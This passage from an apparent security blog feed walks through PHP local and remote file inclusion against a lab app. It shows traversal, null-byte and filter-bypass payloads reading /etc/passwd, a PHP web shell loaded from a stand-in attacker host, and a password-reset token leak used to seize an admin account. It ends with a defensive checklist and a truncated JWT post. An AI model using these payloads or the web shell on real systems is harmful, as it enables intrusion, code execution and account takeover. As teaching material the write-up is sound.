    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="language-powershell">
pagebypassnulbyte.php?lang=hello
</code></pre>
</div>

<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*IdoVUKE4XynMV8wv-73hjA.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>You get this error message:</p>

<div class="alert-error">
<strong>Warning:</strong> include(languages/hello.php): failed to open stream: No such file or directory in /home/wordisbond/Desktop/vulnauth/lfi/pagebypassnulbyte.php on line 97
</div>

<p>This error leaks important info: the app tries to include the file <code class="language-plaintext highlighter-rouge">languages/hello.php</code>. From this, we know two things:</p>

<ul>
  <li>
    <p>The <code class="language-plaintext highlighter-rouge">lang</code> parameter value is appended with <code class="language-plaintext highlighter-rouge">.php</code> inside the <code class="language-plaintext highlighter-rouge">languages/</code> directory.</p>
  </li>
  <li>
    <p>The file path is constructed like: <code class="language-plaintext highlighter-rouge">languages/{lang}.php</code>.</p>
  </li>
</ul>

<p>Since the error message also reveals the full application path (<code class="language-plaintext highlighter-rouge">/home/wordisbond/Desktop/vulnauth/lfi/</code>), we can use it to plan directory traversal attacks.</p>

<h4 id="step-2-attempt-directory-traversal">Step 2: Attempt Directory Traversal</h4>

<p>If we want to access files outside the <code class="language-plaintext highlighter-rouge">languages</code> directory, we can try directory traversal like this:</p>

<div class="code-block-container">
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="language-powershell">
pagebypassnulbyte.php?lang=../../../../../etc/passwd
</code></pre>
</div>

<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*K6K8few1RzMCb6EVykk4IA.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>But we get another error:</p>

<div class="alert-error">
<strong>Warning:</strong> include(languages/../../../../../etc/passwd.php): failed to open stream: No such file or directory in /home/wordisbond/Desktop/vulnauth/lfi/pagebypassnulbyte.php on line 97
</div>

<p>The <code class="language-plaintext highlighter-rouge">.php</code> extension is still appended, so the server tries to load <code class="language-plaintext highlighter-rouge">/etc/passwd.php</code> which doesn’t exist. This means the developer hard-coded <code class="language-plaintext highlighter-rouge">.php</code> after the input.</p>

<h4 id="step-3-bypass-the-php-suffix-with-null-byte-injection">Step 3: Bypass the <code class="language-plaintext highlighter-rouge">.php</code> Suffix with Null Byte Injection</h4>

<p>To bypass this, we can use the Null Byte (<code class="language-plaintext highlighter-rouge">%00</code>) injection technique. Null Byte is a special URL-encoded character (<code class="language-plaintext highlighter-rouge">%00</code>) that terminates strings in some older PHP versions. It tricks the include function to ignore everything after it.</p>

<p>So if you send:</p>

<div class="code-block-container">
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="language-powershell">
pagebypassnulbyte.php?lang=../../../../../etc/passwd%00
</code></pre>
</div>

<p>The include function will interpret:</p>

<div class="code-block-container">
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="language-powershell">
include("languages/../../../../../etc/passwd%00") . ".php");
</code></pre>
</div>

<p>which effectively becomes:</p>

<div class="code-block-container">
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="language-powershell">
include("languages/../../../../../etc/passwd");
</code></pre>
</div>

<p>and the file <code class="language-plaintext highlighter-rouge">/etc/passwd</code> will be included (if the PHP version is vulnerable).</p>

<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*8ngaBwCBAy_qh4XmDeIKBg.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<div class="alert-warning">
<strong>Important Note:</strong> The Null Byte injection technique was fixed in PHP 5.3.4 and later versions. So, on modern PHP versions, %00 won't work anymore.
</div>

<h2 id="bypassing--filters-in-lfi">Bypassing <code class="language-plaintext highlighter-rouge">../</code> Filters in LFI</h2>

<p>In our initial setup, the app lets us change the language using a <code class="language-plaintext highlighter-rouge">lang</code> parameter switching between English and Spanish:</p>

<p><code class="language-plaintext highlighter-rouge">?lang=en.php
?lang=es.php</code></p>

<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*0NvWuC7mRFuZ77tpqJLiqw.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Cy_0X6KLS3d1WY_9TlC8OQ.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>But now the dev got a lil paranoid and added some basic input filtering specifically, they’re trying to block directory traversal by stripping <code class="language-plaintext highlighter-rouge">../</code> from the input.</p>

<p>Let’s test this filter by trying to read a classic LFI target:</p>

<div class="code-block-container">
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="language-powershell">
lang=../../../../../../etc/passwd
</code></pre>
</div>

<p>And we get the following PHP warning:</p>

<div class="alert-error">
<strong>Warning:</strong> include(languages/etc/passwd): Failed to open stream: No such file or directory in /home/wordisbond/Desktop/vulnauth/lfi/pagebypassslash.php on line 76
</div>

<div class="alert-error">
<strong>Warning:</strong> include(): Failed opening 'languages/etc/passwd' for inclusion (include_path='.:/usr/share/php') in /home/wordisbond/Desktop/vulnauth/lfi/pagebypassslash.php on line 76
</div>

<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*owh85fQqNwGykARL0gpTDA.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>If you look closely at the first line, you’ll notice that instead of including <code class="language-plaintext highlighter-rouge">../../etc/passwd</code>, PHP is trying to include:<br />
<strong><code class="language-plaintext highlighter-rouge">languages/etc/passwd</code></strong></p>

<p>So clearly, the app is <strong>stripping all <code class="language-plaintext highlighter-rouge">../</code> instances</strong> from the input via <code class="language-plaintext highlighter-rouge">str_replace('../', '', $_GET['lang'])</code>.</p>

<hr />

<h2 id="bypass-payload">Bypass Payload:</h2>

<p>Try this sneaky payload instead:</p>

<div class="code-block-container">
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="language-powershell">
?lang=....//....//....//....//....//....//etc/passwd
</code></pre>
</div>

<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*AYk1OB7xb0pSH-8cxXli2w.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>And it works.</p>

<hr />

<h3 id="why-does-this-bypass-work">Why does this bypass work?</h3>

<p>Because the filter only removes exact matches of <code class="language-plaintext highlighter-rouge">../</code>. It doesn’t normalize paths or do recursive cleanup. That means:</p>

<ul>
  <li>
    <p><code class="language-plaintext highlighter-rouge">....//</code> ≠ <code class="language-plaintext highlighter-rouge">../</code></p>
  </li>
  <li>
    <p>So <code class="language-plaintext highlighter-rouge">str_replace('../', '', '....//etc/passwd')</code> leaves it untouched</p>
  </li>
  <li>
    <p>The PHP engine still resolves <code class="language-plaintext highlighter-rouge">....//</code> to <code class="language-plaintext highlighter-rouge">../</code> under the hood during path resolution</p>
  </li>
</ul>

<p>Here’s a visual to make it even clearer:</p>

<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ZtlXgty6DiQ8WWU6qMLCBw.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*-14zTekZ8H-LCLHLiBh5BQ.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<h2 id="bypassing-defined-directory-restrictions--input-validation">Bypassing Defined Directory Restrictions + Input Validation</h2>

<p>When developers try to lock down Local File Inclusion (LFI) vulnerabilities, a common defense is forcing the user input to start with a defined directory for example, requiring <code class="language-plaintext highlighter-rouge">lang=languages/en.php</code>. This looks like a solid way to restrict file access, right?</p>

<p>But attackers can still sneak through.</p>

<p>If the app expects a URL like this:</p>

<p><code class="language-plaintext highlighter-rouge">http://example.com/pagebypassslashdefineddirectory.php?lang=languages/en.php</code></p>

<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*4lJhC3Acjxm244h_aQMs8g.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>If you try to send a payload <strong>without</strong> the required directory prefix, like this:</p>

<div class="code-block-container">
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="language-powershell">
?lang=....//....//....//....//....//....//etc/passwd
</code></pre>
</div>

<p>The application <em>rejects</em> it outright, showing an error message such as:</p>

<div class="alert-error">
Invalid path. Must begin with languages/
</div>

<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*k2VmHbm89LgRcf1MP65Z_A.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>This blocks direct traversal attempts that don’t start with <code class="language-plaintext highlighter-rouge">languages/</code>.</p>

<p>However, you can still bypass the restriction by including the required directory prefix and then injecting traversal sequences, like so</p>

<div class="code-block-container">
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="language-powershell">
?lang=languages/....//....//....//....//....//....//etc/passwd
</code></pre>
</div>

<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ELet6uZIW4a92t5L-Mc6EA.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>Here’s the trick:</p>

<ul>
  <li>
    <p>The input <em>starts</em> with <code class="language-plaintext highlighter-rouge">languages/</code> to pass the check</p>
  </li>
  <li>
    <p>The <code class="language-plaintext highlighter-rouge">....//</code> pattern works like <code class="language-plaintext highlighter-rouge">../</code> in file paths, letting you climb out of the intended directory</p>
  </li>
</ul>

<p>This happens because input validation is often done with simple string replacements or prefix checks, missing the full path resolution context leaving the door wide open for crafty traversal bypasses.</p>

<h2 id="remote-file-inclusion-rfi-a-hackers-backdoor-to-your-server">Remote File Inclusion (RFI) A Hacker’s Backdoor to Your Server</h2>

<h3 id="what-is-rfi">What Is RFI?</h3>

<p>Remote File Inclusion (RFI) is a high-severity web vulnerability that occurs when an application dynamically includes external files typically via user-supplied input <strong>without proper validation or sanitization</strong>. When exploited, an attacker can <strong>inject a remote URL</strong> into a file-handling function (like <code class="language-plaintext highlighter-rouge">include()</code>, <code class="language-plaintext highlighter-rouge">require()</code>, etc.), causing the server to fetch and execute malicious code hosted on an external server.</p>

<p>For RFI to be possible, certain PHP configurations need to be enabled most notably:</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">allow_url_fopen = On</code></li>
</ul>

<p>This setting allows PHP to open external URLs as if they were local files, making the inclusion of remote payloads feasible.</p>

<hr />

<h3 id="why-is-rfi-so-dangerous">Why Is RFI So Dangerous?</h3>

<p>Compared to Local File Inclusion (LFI), which is limited to reading files already present on the target server, <strong>RFI opens the door to Remote Code Execution (RCE)</strong> essentially giving attackers the ability to run arbitrary code <strong>from their own server</strong> on the victim system.</p>

<p>Here are some nightmare scenarios that can result from a successful RFI attack:</p>

<ul>
  <li>
    <p><strong>Sensitive Information Disclosure</strong> (e.g., config files, database credentials)</p>
  </li>
  <li>
    <p><strong>Remote Code Execution (RCE)</strong> with full shell access</p>
  </li>
  <li>
    <p><strong>Cross-Site Scripting (XSS)</strong> if the included file contains malicious JavaScript</p>
  </li>
  <li>
    <p><strong>Denial of Service (DoS)</strong> by including large or malicious files</p>
  </li>
  <li>
    <p><strong>Web Shell Uploads</strong> for post-exploitation access and persistence</p>
  </li>
</ul>

<hr />

<h3 id="how-does-an-rfi-attack-work">How Does an RFI Attack Work?</h3>

<p>Let’s break this down with a step-by-step example:</p>

<h4 id="scenario-vulnerable-php-web-app">Scenario: Vulnerable PHP Web App</h4>

<p>You have a page like this:</p>

<div class="code-block-container">
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="language-powershell">
http://example.com/RFI.php?lang=en.php
</code></pre>
</div>

<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*sTBdLcTf3GHgT3DYpYqOmg.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>And the vulnerable code on the backend looks like this:</p>

<p><code class="language-plaintext highlighter-rouge">&lt;?php
    include($_GET['lang']);
?&gt;</code></p>

<p>The developer <strong>didn’t validate or sanitize</strong> the input. That’s the red flag.</p>

<h4 id="step-by-step-exploitation">Step-by-Step Exploitation</h4>

<ol>
  <li>
    <p><strong>Attacker Prepares Payload</strong>
The attacker hosts a malicious file, for example:</p>

    <ul>
      <li>
        <p>URL: <code class="language-plaintext highlighter-rouge">http://attacker.thm/cmd.txt</code></p>
      </li>
      <li>
        <p>Content of <code class="language-plaintext highlighter-rouge">cmd.txt</code>:</p>
      </li>
    </ul>
  </li>
</ol>

<div class="code-block-container">
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="language-php">
&lt;?php

echo "&lt;div style='
    background-color: #111;
    color: #0f0;
    font-family: monospace;
    padding: 20px;
    border: 2px solid red;
    border-radius: 10px;
    text-align: center;
'&gt;
    &lt;h1&gt;💀 You Have Been Pwned 💀&lt;/h1&gt;
    &lt;p&gt;RFI successful. Shell access granted.&lt;/p&gt;
&lt;/div&gt;";

if (isset($_GET['cmd'])) {
    echo "&lt;pre style='background:#000; color:#0f0; padding:10px; border-radius:5px;'&gt;";
    system($_GET['cmd']);
    echo "&lt;/pre&gt;";
} else {
    echo "&lt;p style='color: #f33;'&gt;No command received. Try &lt;code&gt;?cmd=whoami&lt;/code&gt;&lt;/p&gt;";
}

?&gt;
</code></pre>
</div>

<ol>
  <li><strong>Attacker Sends Exploit Request</strong>
They craft a URL to trick the server into loading their file:</li>
</ol>

<div class="code-block-container">
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="language-powershell">
http://example.com/RFI.php?lang=http://10.0.2.15:8000/cmd.txt&amp;cmd=whoami
  </code></pre>
</div>

<ol>
  <li>
    <p><strong>Server Fetches and Executes File</strong>
If <code class="language-plaintext highlighter-rouge">allow_url_fopen</code> is enabled and no filtering is applied, the server will:</p>

    <ul>
      <li>
        <p>Make a request to <code class="language-plaintext highlighter-rouge">attacker.thm</code></p>
      </li>
      <li>
        <p>Fetch <code class="language-plaintext highlighter-rouge">cmd.txt</code></p>
      </li>
      <li>
        <p>Inject and execute its contents within the application context</p>
      </li>
    </ul>
  </li>
  <li>
    <p><strong>Code Execution</strong>
The server runs whatever PHP is in, it could be a full PHP web shell (<code class="language-plaintext highlighter-rouge">system($_GET['cmd'])</code>, reverse shell, etc.)</p>
  </li>
</ol>

<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*CUic41Xg4tJ3uV-29tGv4A.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<h3 id="staying-sharp-defending-against-file-inclusion-vulnerabilities">staying Sharp: Defending Against File Inclusion Vulnerabilities</h3>

<p>Web apps are dope, but if you’re not securing them right, you’re just leaving the door wide open for attackers. One of the most common issues? <strong>File Inclusion Vulnerabilities</strong> (think LFI, RFI). They’re sneaky, dangerous, and way too common in misconfigured PHP setups.</p>

<h4 id="why-you-should-care">Why You Should Care</h4>

<p>Understanding how these bugs work and how to prevent them is key to building (or hacking) safely. Whether you’re a dev, hacker, or just security-curious, here’s the lowdown on protecting your app from getting wrecked.</p>

<hr />

<h3 id="prevention-checklist">Prevention Checklist</h3>

<p><strong>1. Keep everything updated.</strong>
Your PHP version, CMS, frameworks, plugins if it runs code, it needs updates. Old versions = old vulnerabilities.</p>

<p><strong>2. Hide your errors.</strong>
Turn off PHP error reporting in production (<code class="language-plaintext highlighter-rouge">display_errors = Off</code>). You don’t wanna leak your file paths or internal structure to attackers.</p>

<p><strong>3. Use a WAF.</strong><br />
Web Application Firewalls can filter out sketchy requests before they reach your app. Tools like Cloudflare or ModSecurity can be lifesavers.</p>

<p><strong>4. Lock down dangerous PHP features.</strong>
If your app doesn’t use remote file access, disable these in <code class="language-plaintext highlighter-rouge">php.ini</code>:</p>

<p><code class="language-plaintext highlighter-rouge">allow_url_fopen = Off
allow_url_include = Off</code></p>

<p><strong>5. Control input protocols.</strong>
Limit the types of wrappers (e.g., <code class="language-plaintext highlighter-rouge">php://</code>, <code class="language-plaintext highlighter-rouge">data://</code>, <code class="language-plaintext highlighter-rouge">zip://</code>) your app can handle. Analyze what you <em>really</em> need and block the rest.</p>

<p><strong>6. Sanitize &amp; validate all user input.</strong>
Never trust user input. Use strict input validation. Assume attackers will try <code class="language-plaintext highlighter-rouge">....//</code>, null bytes, encoded payloads and block ‘em.</p>

<p><strong>7. Whitelist &gt; Blacklist.</strong>
Define exactly what files can be included, and from where. Don’t rely on just blacklisting risky strings like <code class="language-plaintext highlighter-rouge">../</code> it’s bypassable.</p>]]></content><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><category term="blog" /><category term="cybersecurity" /><category term="red team" /><category term="pentesting" /><category term="bug bounty" /><category term="ctf" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">Logic Flaw Authentication</title><link href="http://localhost:4000/blog/cybersecurity/2025/05/29/intro.html" rel="alternate" type="text/html" title="Logic Flaw Authentication" /><published>2025-05-29T00:00:00-04:00</published><updated>2025-05-29T00:00:00-04:00</updated><id>http://localhost:4000/blog/cybersecurity/2025/05/29/intro</id><content type="html" xml:base="http://localhost:4000/blog/cybersecurity/2025/05/29/intro.html"><![CDATA[<p><img src="http://art.vx-underground.org/art/pancak3_faceless_shadow_men_standing_in_the_rain_of_digital_lig_3628bb69-3850-4c8a-ab1b-8d8237718ccb.png" alt="wallpaper" width="500" style="     display: block;     margin: 50px auto 40px;     border-radius: 18px;     border: 2.5px solid #111; /* crisp black border */     box-shadow: 0 10px 25px rgba(0, 0, 0, 0.12); /* soft black shadow */     transition: transform 0.3s ease, box-shadow 0.3s ease;     cursor: pointer;   " onmouseover="this.style.transform='scale(1.05)'; this.style.boxShadow='0 15px 35px rgba(0, 0, 0, 0.25)';" onmouseout="this.style.transform='scale(1)'; this.style.boxShadow='0 10px 25px rgba(0, 0, 0, 0.12)';" /></p>

<h2 id="the-password-reset-token-leak">The Password Reset Token Leak</h2>

<p>When you think about authentication, the first things that come to mind are usually strong passwords, encryption, or multi-factor security. But what if the real problem isn’t a missing cipher or a weak password? What if it’s the logic behind how you handle sensitive data that blows your security wide open?</p>

<p>One classic example? Password reset flows that leak tokens insecurely breaking the whole authentication logic, no matter how tight your password rules are.</p>

<h2 id="the-logic-flaw-leaking-reset-tokens-in-api-responses">The Logic Flaw: Leaking Reset Tokens in API Responses</h2>

<p>Password reset tokens are supposed to be secret. But in some apps, when you request a reset, the server sends the token <em>right back</em> in the HTTP response. That means anyone who can see that response whether a hacker sniffing your Wi-Fi, a rogue browser extension, or someone with access to your proxy logs can grab the token and hijack the account.</p>

<p>This isn’t just a bad idea. It’s a fundamental logic flaw:</p>

<ul>
  <li>
    <p>You’re <strong>trusting the client</strong> to keep the token secret.</p>
  </li>
  <li>
    <p>You’re <strong>exposing a sensitive credential</strong> through an insecure channel.</p>
  </li>
  <li>
    <p>You’re <strong>breaking the authentication flow</strong> by giving attackers a shortcut to reset passwords without ever logging in.</p>
  </li>
</ul>

<h2 id="why-this-breaks-authentication-logic">Why This Breaks Authentication Logic</h2>

<p>Authentication relies on secrets. Reset tokens are one-time secrets meant to verify that only the rightful user can reset their password. But if those secrets are freely shared in API responses, the attacker’s path becomes effortless.</p>

<p>In short: you can have the strongest password hashing, but if you leak your reset tokens, your entire login security is toast.</p>

<h3 id="breaking-down-authentication-exploiting-the-password-reset-feature">Breaking Down Authentication: Exploiting the Password Reset Feature</h3>

<p>Alright, let’s dive into the authentication flow on the <strong>HackMe</strong> website and see how we can escalate from a normal user to the admin.</p>

<p>Imagine the login page looks like this:</p>

<p><code class="language-plaintext highlighter-rouge">Welcome to HackMe Website
Login | Reset Password</code></p>

<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*6eX4kwnsM3SbMRvFVKxSeQ.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>For starters, we have these normal user credentials:<br />
<strong>user@hackme.com / password123</strong><br />
Logging in with these works fine, and after login, we get this message:</p>

<p>Welcome user@hackme.com!
You are logged in as a normal user.
Logout</p>

<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Sa5irwzZU7G9etRvaa30Ew.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*jFsGSbura_B3EIaVmRuaYQ.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>Cool, but we want to level up specifically, get admin access.</p>

<p>So, let’s check out the <strong>Reset Password</strong> option. The interface asks for an email:</p>

<p>Reset Password<br />
Enter your email:</p>

<p>We swap out <strong>user@hackme.com</strong> with <strong>admin@hackme.com</strong> and hit send. The site responds:</p>

<p><code class="language-plaintext highlighter-rouge">If your email exists, a password reset token has been sent.</code></p>

<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*PZIAlhoXYY0U1Z08OK1rSw.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*fQ3lbKZUtufRaTfwPYkYww.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>Pretty standard, right? But what’s going on behind the scenes? Time to dig deeper.</p>

<p>We repeat the request but this time, monitor it closely using <strong>Burp Suite</strong>. On the left, we see the HTTP request, and on the right, the response.</p>

<p>If we inspect carefully, there’s a <strong>password reset token</strong> inside the response, along with an endpoint URL.</p>

<p>Now, here’s the juicy part using that token, we access the reset endpoint:</p>

<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*RBjMTih-8085WJ_9uTMBOg.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p><code class="language-plaintext highlighter-rouge">Confirm Password Reset</code></p>

<p>Reset Token: [token here]</p>

<p>New Password: [new password here]</p>

<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*OxdEN5BHDZeDaRvLc7ToEQ.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; width: 920px; cursor: zoom-in;" /></p>

<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*zuLfksHNxCab98D60FISEg.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; width: 920px; cursor: zoom-in;" /></p>

<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*8RbEE-Rki2rkNB4ZuoOh-Q.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; width: 920px; cursor: zoom-in;" /></p>

<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ba7gi-YO1Nutufs7n3phVA.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; width: 920px; cursor: zoom-in;" /></p>

<p>By plugging the token in and setting a new password, we effectively reset the <strong>admin</strong> password and gain full access.</p>

<hr />

<p>This is a classic example of how insecure password reset mechanisms can be abused to escalate privileges. Always check how tokens are generated and validated. Weak flows like this can be your golden ticket.</p>

<h1 id="jwt-vulnerability-bypassing-role-based-access">JWT Vulnerability: Bypassing Role-Based Access</h1>
<hr />

<p>In this example, we’re dealing with a login interface that looks pretty normal on the surface but has a nasty misconfig behind the scenes.</p>

<h3 id="-credentials">🧪 Credentials</h3>

<p>You can log in using:</p>

<p><code class="language-plaintext highlighter-rouge">Username: user
Password: userpass</code></p>

<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*BjFKPVRkJzIGMlVpdlQxaw.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*4kLNxty27qwQS3ajrCWb9g.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>Once you’re in, you land on this dashboard:</p>

<p><code class="language-plaintext highlighter-rouge">Welcome, user!
Your role: user
[ Go to Admin Panel ]</code></p>

<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*MpiJkakYpbK7crQyQMYiiw.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" />
But when you click <strong>Go to Admin Panel</strong>, you get smacked with:</p>

<p><code class="language-plaintext highlighter-rouge">Access Denied
You are not an admin.
[ Back ]</code></p>

<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*uSSLXnP1lnqkItrV0EZU_w.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>So far, standard RBAC stuff, right? Let’s peek under the hood.</p>

<hr />

<h3 id="token-inspection-burp-suite">Token Inspection (Burp Suite)</h3>

